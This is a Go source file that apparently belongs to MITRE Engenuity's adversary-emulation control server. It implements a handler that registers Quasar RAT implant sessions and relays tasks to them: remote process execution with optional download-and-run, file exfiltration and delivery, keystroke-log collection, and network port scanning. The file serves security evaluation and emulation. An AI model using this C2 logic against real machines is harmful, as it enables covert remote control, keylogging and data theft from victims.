package quasar

import (
    "errors"
    "fmt"
    "regexp"
    "strconv"
    "strings"
    "sync"
    "time"
    
    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/util"
    "attackevals.mitre-engenuity.org/control_server/logger"
)

const (
    SESSION_PING_SLEEP = 15
    TASK_POLLING_SLEEP = 10
    DEFAULT_MAX_TASK_POLLING_COUNT = 12 // default ~2 minute timeout
)

var (
    cidrRegExp = regexp.MustCompile(`^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})/(\d{1,2})$`)
)

// Used for mocking HTTP GET request. Takes URL string parameter and returns response bytes or error.
type HttpGetRequestResponseGetter func(string) ([]byte, error)

// Used for mocking HTTP GET request. Takes URL, content type, and POST data parameter, and returns response bytes or error.
type HttpPostRequestResponseGetter func(string, string, []byte) ([]byte, error)

// Used for mocking time.Sleep
type SleepFuncWrapper func(d time.Duration)

type QuasarHandler struct {
    restAPIaddress string
    baseQuasarRestApiUrl string
    sessionConnectedMap map[string]bool // track sessions and whether or not they're actively connected
    sessionBusyStatusMap map[string]bool // track whether sessions are busy performing tasks or not (true for busy false for free)
    
    httpGetResponseGetter HttpGetRequestResponseGetter // wrapper for http.Get and reading body response
    httpPostResponseGetter HttpPostRequestResponseGetter // wrapper for performing post request and reading body response
    sleepFuncWrapper SleepFuncWrapper
    
    sessionBusyStatusMutex sync.Mutex
}

type QuasarWrappedFuncHandles struct {
    httpGetResponseGetter HttpGetRequestResponseGetter
    httpPostResponseGetter HttpPostRequestResponseGetter
    sleepFuncWrapper SleepFuncWrapper
}

// Factory method for creating a Quasar C2 handler
func quasarHandlerFactory(funcHandles *QuasarWrappedFuncHandles) *QuasarHandler {
    // restAPIaddress, server, and listenAddress will be initialized when handler is started
    return &QuasarHandler{
        sessionConnectedMap: make(map[string]bool),
        sessionBusyStatusMap: make(map[string]bool),
        httpGetResponseGetter: funcHandles.httpGetResponseGetter,
        httpPostResponseGetter: funcHandles.httpPostResponseGetter,
        sleepFuncWrapper: funcHandles.sleepFuncWrapper,
    }
}

// Creates and adds the Quasar C2 handler to the map of available C2 handlers.
func init() {
    wrappedFuncHandles := &QuasarWrappedFuncHandles{
        httpGetResponseGetter: PerformHttpGet,
        httpPostResponseGetter: PerformHttpPost,
        sleepFuncWrapper: time.Sleep,
    }
    util.AvailableHandlers["quasar"] = quasarHandlerFactory(wrappedFuncHandles)
}


// StartHandler starts the Quasar C2 handler server
func (q *QuasarHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // config entry must contain quasar C2 server address and port
    quasarApiEndpoint, err := config.GetHostPortString(configEntry)
    if err != nil {
        return err
    }
    q.baseQuasarRestApiUrl = API_PROTOCOL_BASE + quasarApiEndpoint
    
    logger.Info("Starting Quasar Handler")

    // make sure we know the REST API address
    q.restAPIaddress = restAddress
    
    // start beacon manager goroutine
    go q.beaconManagerRoutine()
    
    return nil
}

// StopHandler stops the Quasar server
func (q *QuasarHandler) StopHandler() error {
    logger.Info("Stopping Quasar handler")
    return nil
}

// Periodically ping Quasar C2 REST API server for active sessions and manage them
func (q *QuasarHandler) beaconManagerRoutine() {
    for {
        logger.Debug("[QUASAR] Pinging Quasar REST API server for active session information.")
        sessions, err := q.getActiveSessions()
        if err != nil {
            logger.Error("[QUASAR] Failed to fetch session information from Quasar REST API server: " + err.Error())
        } else {
            q.updateSessionsConnectedStatus(sessions)
            q.processPendingTasks(sessions)
        }
        q.sleepFuncWrapper(SESSION_PING_SLEEP * time.Second)
    }
}

func (q *QuasarHandler) updateSessionsConnectedStatus(sessions []QuasarSession) {
    // For tracking which previously active sessions beaconed back and which didn't
    previouslyConnectedBeaconedBack := make(map[string]bool)
    for sessionId, previouslyConnected := range q.sessionConnectedMap {
        if previouslyConnected {
            previouslyConnectedBeaconedBack[sessionId] = false
        }
    }
    
    for _, session := range sessions {
        previouslyConnected, ok := q.sessionConnectedMap[session.Id]
        q.sessionConnectedMap[session.Id] = true
        if !ok {
            // New implant - create new Evals C2 session via REST API
            elevatedString := ""
            if session.IsElevated() {
                elevatedString = "ELEVATED"
            }
            logger.Info(fmt.Sprintf("[QUASAR] Detected first-time %s quasar implant connection with session ID %s. Creating Evals c2 server session.", elevatedString, session.Id))
            err := q.registerNewImplant(&session)
            if err != nil {
                logger.Error(err.Error())
                continue
            }
            q.setSessionTaskingStatusFree(session.Id) // session is available to be tasked
        } else {
            // Handle existing session
            previouslyConnectedBeaconedBack[session.Id] = true
            if previouslyConnected {
                // Session already connected before
                logger.Debug(fmt.Sprintf("[QUASAR] Quasar session %s still alive.", session.Id))
            } else {
                // Beacon back from the dead
                logger.Info(fmt.Sprintf("[QUASAR] Previously disconnected quasar session %s resumed connection to Quasar server.", session.Id))
            }
        }
    }
    
    // Check which previously connected sessions didn't beacon back
    for sessionId, beaconedBack := range previouslyConnectedBeaconedBack {
        if !beaconedBack {
            logger.Info(fmt.Sprintf("[QUASAR] Quasar session %s lost connection to Quasar server.", sessionId))
            q.sessionConnectedMap[sessionId] = false
        }
    }
}

func (q *QuasarHandler) registerNewImplant(session *QuasarSession) error {
    implantData, err := createNewSessionDataBytes(session)
    if err != nil {
        return errors.New(fmt.Sprintf("[QUASAR] Failed to create JSON info for session ID %s: %s", session.Id, err.Error()))
    }
    restResponse, err := util.ForwardRegisterImplant(q.restAPIaddress, implantData)
    if err != nil {
        return errors.New(fmt.Sprintf("[QUASAR] Failed to forward registration for session ID %s: %s", session.Id, err.Error()))
    }
    logger.Info(restResponse)
    logger.Success(fmt.Sprintf("[QUASAR] Successfully created session for Quasar implant %s.", session.Id))
    return nil
}

func (q *QuasarHandler) processPendingTasks(sessions []QuasarSession) {
    for _, session := range sessions {
        if !q.isSessionBusy(session.Id) {
            // Check if there is a pending task for this session
            taskStr, err := util.ForwardGetTask(q.restAPIaddress, session.Id)
            if err != nil {
                logger.Error(fmt.Sprintf("[QUASAR] Error fetching task for session %s: %s", session.Id, err.Error()))
                continue
            }
            if len(taskStr) == 0 {
                continue
            }
            
            // Kick off tasking
            sessionId := session.Id
            go func() {
                task, err := extractEvalsTaskStruct(taskStr)
                if err != nil {
                    logger.Error(fmt.Sprintf("[QUASAR] Error extracting task struct for session %s: %s", sessionId, err.Error()))
                    logger.Error(fmt.Sprintf("[QUASAR] Problematic task string: %s", taskStr))
                    return
                }
                logger.Info(fmt.Sprintf("[QUASAR] Performing task %d for session %s, timeout value of %d seconds", task.TaskNum, sessionId, task.Timeout))
                q.setSessionTaskingStatusBusy(sessionId)
                taskErr := q.performTask(sessionId, task)
                if taskErr != nil {
                    logger.Error(fmt.Sprintf("[QUASAR] PerformTask error for session %s, task num %d: %s", sessionId, task.TaskNum, taskErr.Error()))
                } else {
                    logger.Info(fmt.Sprintf("[QUASAR] PerformTask completed for session %s, task num %d", sessionId, task.TaskNum))
                }
                q.setSessionTaskingStatusFree(sessionId)
            }()
        } else {
            logger.Debug(fmt.Sprintf("[QUASAR] session %s still busy, waiting until next cycle to grab next task.", session.Id))
        }
    }
}

func (q *QuasarHandler) performTask(sessionId string, task *QuasarEvalsTask) error {
    switch task.TaskType {
    case TASK_TYPE_EXEC_PROC:
        if len(task.ProcPath) == 0 && len(task.DownloadUrl) == 0 {
            return errors.New("Process execution task requires either a local binary path or a downkoad URL. Neither provided")
        }
        logger.Info(fmt.Sprintf(
            "[Quasar] Instructing session %s to execute process:\n\tPath: %s\n\tArgs: %s\n\tDownload url: %s\n\tDownload dest: %s\n\tUse shell: %v\n\tWait for output: %v\n\tNo window: %v",
            sessionId,
            task.ProcPath,
            task.ProcArgs,
            task.DownloadUrl,
            task.DownloadDst,
            task.ShellExec,
            task.GetOutput,
            task.NoWindow,
        ))
        return q.performImplantTask(sessionId, task)
    case TASK_TYPE_FILE_UPLOAD:
        src := task.FileTransferSource
        dst := task.FileTransferDest
        if len(src) == 0 {
            return errors.New("File upload task requires a source file. None provided")
        }
        logger.Info(fmt.Sprintf("[Quasar] Instructing session %s to upload file %s to Quasar server", sessionId, src))
        return q.performFileTransfer(sessionId, src, dst, task.Timeout, true)
    case TASK_TYPE_FILE_DOWNLOAD:
        src := task.FileTransferSource
        dst := task.FileTransferDest
        if len(src) == 0 {
            return errors.New("File download task requires a source file. None provided")
        }
        logger.Info(fmt.Sprintf("[Quasar] Instructing session %s to download file %s from Quasar server and save as %s", sessionId, src, dst))
        return q.performFileTransfer(sessionId, src, dst, task.Timeout, false)
    case TASK_TYPE_KEYSTROKE_LOG_UPLOAD:
        logger.Info(fmt.Sprintf("[Quasar] Instructing session %s to upload keystroke logs to Quasar server", sessionId))
        return q.performKeystrokeLogUpload(sessionId, task.Timeout)
    case TASK_TYPE_PORT_SCAN:
        targetRange := strings.TrimSpace(task.TargetRange)
        targetPorts := task.TargetPorts
        err := validateCidr(targetRange)
        if err != nil {
            return errors.New("[Quasar] Invalid CIDR range provided for port scan: " + err.Error())
        }
        if len(targetPorts) == 0 {
            return errors.New("[Quasar] No target ports provided for port scan.")
        }
        logger.Info(fmt.Sprintf("[Quasar] Instructing session %s to perform a port scan for ports %v against target range %s", sessionId, targetPorts, targetRange))
        return q.performImplantTask(sessionId, task)
    default:
        return errors.New(fmt.Sprintf("Unsupported task type %d", task.TaskType))
    }
}

func (q *QuasarHandler) performKeystrokeLogUpload(sessionId string, timeout int) error {
    // Send request to Quasar Server and retrieve created keystroke upload task info
    uploadTaskInfo, err := q.sendKeylogUploadTaskApiRequest(sessionId)
    if err != nil {
        return errors.New(fmt.Sprintf("Failed to send keystroke log upload API request: %s", err.Error()))
    }
    
    // Wait until task completes or times out
    finishedTask, err := q.waitForKeystrokeUploadCompletion(uploadTaskInfo.TaskId, timeout)
    if err != nil {
        return errors.New(fmt.Sprintf("Failed to wait for keystroke log upload task completion for task ID %s: %s", uploadTaskInfo.TaskId, err.Error()))
    }
    
    baseErrMsg := ""
    switch finishedTask.StatusCode {
    case TASK_STATUS_SUCCESS:
        logger.Success(fmt.Sprintf("Keystroke log upload task %s successfully completed on Quasar server. Forwarding uploaded log files to evals C2 REST API server", finishedTask.TaskId))
    case TASK_STATUS_ERROR:
        return errors.New(fmt.Sprintf("Keystroke log upload task %s terminated due to an error: %s", finishedTask.TaskId, finishedTask.StatusErrMsg))
    case TRANSFER_STATUS_PARTIAL_SUCCESS:
        logger.Success(fmt.Sprintf("Keystroke log upload task %s partially succeeded. Forwarding uploaded log files to evals C2 REST API server", finishedTask.TaskId))
        baseErrMsg = fmt.Sprintf("Keystroke log upload task %s partially succeeded: %s", finishedTask.TaskId, finishedTask.StatusErrMsg)
    default:
        return errors.New(fmt.Sprintf("Unsupported keystroke log upload task status code %d for task ID %s", finishedTask.StatusCode, finishedTask.TaskId))
    }
    
    // Fetch uploaded keystroke log files 
    response, err := q.fetchAndForwardUploadedKeystrokeLogs(sessionId, finishedTask.TransferIds)
    if len(response) > 0 {
        logger.Success(response) // log whatever uploaded files we were able to forward
    }
    if err != nil {
        if len(baseErrMsg) > 0 {
            return errors.New(baseErrMsg + "\n\tAdditional errors: " + err.Error())
        }
        return err
    } else if len(baseErrMsg) > 0 {
        return errors.New(baseErrMsg)
    }
    return nil
}

func (q *QuasarHandler) performImplantTask(sessionId string, evalsTask *QuasarEvalsTask) error {
    // Send request to Quasar server and retrieve created task info
    implantTask, err := q.sendImplantTaskApiRequest(sessionId, evalsTask)
    if err != nil {
        return errors.New(fmt.Sprintf("Failed to send implant task API request: %s", err.Error()))
    }
    
    // Wait until task completes or times out
    finishedTask, err := q.waitForTaskCompletion(implantTask.TaskId, evalsTask.Timeout)
    if err != nil {
        return errors.New(fmt.Sprintf("Failed to wait for task completion for task ID %s: %s", implantTask.TaskId, err.Error()))
    }
    
    switch finishedTask.StatusCode {
    case TASK_STATUS_SUCCESS:
        // Forward task stdout and stderr to REST API server
        var output string
        if evalsTask.TaskType == TASK_TYPE_EXEC_PROC {
            if finishedTask.GetOutput {
                output = fmt.Sprintf(
                    "Process %s (PID %d) finished with exit code %d\nSTDOUT:\n%s\n\nSTDERR:\n%s\n", 
                    finishedTask.ProcPath, 
                    finishedTask.PID, 
                    finishedTask.ExitCode, 
                    finishedTask.Stdout, 
                    finishedTask.Stderr,
                )
            } else {
                output = fmt.Sprintf("Process %s started with PID %d", finishedTask.ProcPath, finishedTask.PID)
            }
        } else if evalsTask.TaskType == TASK_TYPE_PORT_SCAN {
            output = generatePortScanResultStr(finishedTask.ScanResult)
        } else {
            return errors.New(fmt.Sprintf("Unsupported task type %d", evalsTask.TaskType))
        }
        resp, err := util.ForwardTaskOutput(q.restAPIaddress, sessionId, []byte(output))
        if err != nil {
            return errors.New(fmt.Sprintf("Failed to forward task output to evals REST API server: %s", err.Error()))
        }
        logger.Success(resp)
        return nil
    case TASK_STATUS_ERROR:
        return errors.New(fmt.Sprintf("Task %s terminated due to an error: %s", finishedTask.TaskId, finishedTask.StatusMsg))
    default:
        return errors.New(fmt.Sprintf("Unsupported task status code %d for task ID %s", finishedTask.StatusCode, finishedTask.TaskId))
    }
}

func (q *QuasarHandler) performFileTransfer(sessionId string, src string, dst string, timeout int, upload bool) error {
    // send API request to kick off transfer
    var transfer *QuasarFileTransfer
    var err error
    if upload {
        transfer, err = q.sendFileUploadApiRequest(sessionId, src, dst)
    } else {
        transfer, err = q.sendFileDownloadApiRequest(sessionId, src, dst)
    }
    if err != nil {
        return errors.New(fmt.Sprintf("Error when sending file transfer API request: %s", err.Error()))
    }

    // Wait until transfer completes or times out
    finishedTransfer, err := q.waitForTransferCompletion(transfer.Id, timeout)
    if err != nil {
        return err
    }
    
    switch finishedTransfer.StatusCode {
    case TRANSFER_STATUS_SUCCESS:
        if upload {
            // fetch the uploaded file and forward it to the evals c2 server REST API
            fileName := getUploadedFileName(transfer.LocalPath) // local path is where the file is saved on the quasar server
            logger.Success(fmt.Sprintf("File upload %d successfully completed on Quasar server. Forwarding uploaded file to evals C2 REST API server as %s", finishedTransfer.Id, fileName))
            response, err := q.fetchAndForwardUploadedFile(finishedTransfer.Id, fileName)
            if err != nil {
                return err
            }
            logger.Success(response)
        } else {
            logger.Success(fmt.Sprintf("File download %d successfully completed. File saved to %s", finishedTransfer.Id, finishedTransfer.RemotePath))
        }
        return nil
    case TRANSFER_STATUS_ERROR:
        return errors.New(fmt.Sprintf("File transfer %d terminated due to an error: %s", finishedTransfer.Id, finishedTransfer.StatusMsg))
    case TRANSFER_STATUS_CANCELED:
        return errors.New(fmt.Sprintf("File transfer %d was canceled", finishedTransfer.Id))
    default:
        return errors.New(fmt.Sprintf("Unsupported file transfer status code %d for file transfer %d", finishedTransfer.StatusCode, finishedTransfer.Id))
    }
}

func validateCidr(cidr string) error {
    if !cidrRegExp.MatchString(cidr) {
        return errors.New("Invalid format: " + cidr)
    }
    groups := cidrRegExp.FindStringSubmatch(cidr)
    if groups == nil || len(groups) != 6 {
        return errors.New("Invalid format: " + cidr)
    }
    // Validate IP octets and CIDR mask
    for _, octetStr := range groups[1:5] {
        octet, err := strconv.Atoi(octetStr)
        if err != nil {
            return err
        }
        if octet > 255 {
            return errors.New("IP address octet too large: " + octetStr)
        }
    }
    mask, err := strconv.Atoi(groups[5])
    if err != nil {
        return err
    }
    if mask == 0 || mask > 32 {
        return errors.New(fmt.Sprintf("Invalid CIDR mask: %d", mask))
    }
    
    return nil
}

func generatePortScanResultStr(results map[string][]int) string {
    if len(results) == 0 {
        return "No scan results"
    }
    output := "Scan results:\n"
    for ip, ports := range results {
        for _, port := range ports {
            output += fmt.Sprintf("\t%s:%d\n", ip, port)
        }
    }
    return output
}
